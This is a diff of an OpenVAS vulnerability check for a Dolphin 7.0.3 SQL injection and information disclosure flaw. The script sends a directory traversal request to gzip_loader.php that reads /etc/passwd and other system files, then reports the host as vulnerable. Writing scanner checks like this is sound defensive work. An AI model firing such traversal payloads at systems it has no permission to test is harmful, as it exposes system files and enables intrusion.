@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dolphin_44620.nasl 5306 2017-02-16 09:00:16Z teissa $
+# $Id: gb_dolphin_44620.nasl 5760 2017-03-29 10:24:17Z cfi $
 #
 # Dolphin SQL Injection and Information Disclosure Vulnerabilities
 #
@@ -33,12 +33,11 @@ exploit latent vulnerabilities in the underlying database.
 
 Dolphin 7.0.3 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100893);
- script_version("$Revision: 5306 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
+ script_version("$Revision: 5760 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:24:17 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-11-05 13:21:25 +0100 (Fri, 05 Nov 2010)");
  script_bugtraq_id(44620);
  script_tag(name:"cvss_base", value:"7.5");
@@ -46,14 +45,14 @@ if (description)
 
  script_name("Dolphin SQL Injection and Information Disclosure Vulnerabilities");
 
- script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44620");
+ script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/44620");
  script_xref(name : "URL" , value : "http://www.boonex.com");
 
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -62,33 +61,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+include("host_details.inc");
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/dolphin",cgi_dirs());
+files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/dolphin", cgi_dirs( port:port ) ) ) {
 
-  req = string("GET ",dir,"/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\r\n");
-  req = string(req, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; OpenVAS)\r\n");
-  req = string(req, "Host: ",get_host_name(),"\r\n");
-  req = string(req, "Accept-Encoding: None\r\n\r\n\r\n");
+  if( dir == "/" ) dir = "";
 
-  soc = http_open_socket(port);
-  if(!soc)exit(0);
+  foreach file (keys(files)) {
 
-  send(socket:soc, data:req);
-  r = recv(socket: soc, length: 2048);
-  http_close_socket(soc);
+    url = dir + "/gzip_loader.php?file=../../../../../../../../../../../../../../../../" + files[file];
 
-  if(egrep(pattern:"root:.*:0:[01]:",string:r)) {
-    security_message(port:port); 
-    exit(0);
-  }  
-
+    if(http_vuln_check(port:port, url:url,pattern:file)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+  }
 }
 
-exit(0);
+exit( 99 );
